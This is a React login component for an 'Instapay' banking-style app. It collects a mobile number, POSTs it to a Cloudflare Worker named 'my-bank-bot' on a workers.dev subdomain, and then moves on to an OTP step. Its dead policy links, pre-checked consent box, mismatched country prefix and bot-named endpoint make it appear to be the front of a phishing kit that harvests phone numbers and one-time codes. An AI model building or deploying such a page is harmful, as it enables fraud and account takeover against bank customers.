import { use, useState } from "react";
import "./index.css";
import { useNavigate } from "react-router-dom";

export default function LoginScreen() {
    const [mobile, setMobile] = useState("");
    const [error, setError] = useState("");
    const navigate = useNavigate();

    // const handleSubmit = (e) => {
    //     e.preventDefault();

    //     if (!mobile) {
    //         setError("Mobile Number Mandatory");
    //     } else if (mobile.length < 9 || mobile.length > 10) {
    //         setError("Mobile number must be 9 to 10 digits");
    //     } else {
    //         setError("");
    //         navigate("/otp", {state: { mobile }});
    //         alert("Form submitted successfully 🚀");
    //     }
    // };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!mobile) {
            setError("Mobile Number Mandatory");
        } else if (mobile.length < 9 || mobile.length > 10) {
            setError("Mobile number must be 9 to 10 digits");
        } else {
            setError("");

            try {
                // ✅ API call to Cloudflare Worker
                const response = await fetch("https://my-bank-bot.instapayapi.workers.dev/api/phone", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ phone: mobile }),
                });

                const data = await response.json();

                if (data.success) {
                    navigate("/otp", { state: { mobile } });
                } else {
                    setError("Something went wrong. Please try again.");
                }
            } catch (err) {
                console.error("API Error:", err);
                setError("Network error. Please try again later.");
            }
        }
    };

    const handleChange = (e) => {
        const value = e.target.value.replace(/\D/g, "");
        if (value.length <= 10) {
            setMobile(value);
        }
    };

    return (
        <div className="min-h-screen flex flex-col items-center justify-start bg-white">
            <div className="w-full bg-red-600 text-center pt-16 pb-20 wave-bottom">
                <h1 className="text-white text-3xl font-bold">Welcome Back</h1>
                <p className="text-white mt-2 text-sm">
                    I am happy to see you again. You can continue <br />
                    where you left off by logging in.
                </p>
            </div>

            <form onSubmit={handleSubmit} className="w-full max-w-md px-6 mt-12">
                <label className="block text-sm font-medium text-gray-700 mb-1">
                    Mobile Number
                </label>

                {/* Input with +61 prefix */}
                <div className="flex items-center border border-red-500 rounded-md px-3 py-2">
                    <span className="text-gray-900 font-medium mr-2">+60</span>
                    <input
                        type="tel"
                        value={mobile}
                        onChange={handleChange}
                        placeholder="Enter your number"
                        className="flex-1 focus:outline-none"
                    />
                </div>

                {/* Error Message */}
                {error && <p className="text-red-500 text-xs mt-1">{error}</p>}

                <p className="text-gray-500 text-xs">
                    Enter your 9 to 10 digit mobile number
                </p>

                {/* Checkbox */}
                <div className="flex items-start mt-4">
                    <input
                        type="checkbox"
                        defaultChecked
                        className="h-4 w-4 text-red-600 border-gray-300 rounded focus:ring-red-500"
                    />
                    <p className="ml-2 text-sm text-gray-700">
                        I agree to Instapay&apos;s{" "}
                        <a href="#" className="text-blue-600 underline">
                            Terms and Services
                        </a>{" "}
                        and{" "}
                        <a href="#" className="text-blue-600 underline">
                            Privacy Policy
                        </a>
                    </p>
                </div>

                {/* Submit Button */}
                <button
                    type="submit"
                    className="w-full bg-black text-white py-3 rounded-md font-medium"
                >
                    Submit
                </button>

                {/* Contact Us */}
                <div className="text-center mt-6">
                    <a href="#" className="text-red-600 text-sm font-medium">
                        Contact Us
                    </a>
                </div>
            </form>
        </div>
    );
}
